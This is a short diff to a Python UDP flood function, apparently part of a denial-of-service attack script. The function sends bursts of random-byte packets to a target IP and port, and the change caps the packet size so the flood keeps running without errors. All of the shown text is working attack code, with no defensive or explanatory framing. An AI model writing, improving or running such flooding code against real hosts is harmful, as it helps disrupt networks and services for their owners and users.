@@ -163,7 +163,7 @@ def UDP(ip, port, size):#udp flood(best size is 512-1024, if size too big router
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		try:
 			for _ in range(200):
-				udpbytes = random._urandom(int(size))
+				udpbytes = random._urandom(min(65500, size))
 				s.sendto(udpbytes, sendip)
 			s.close()
 		except:
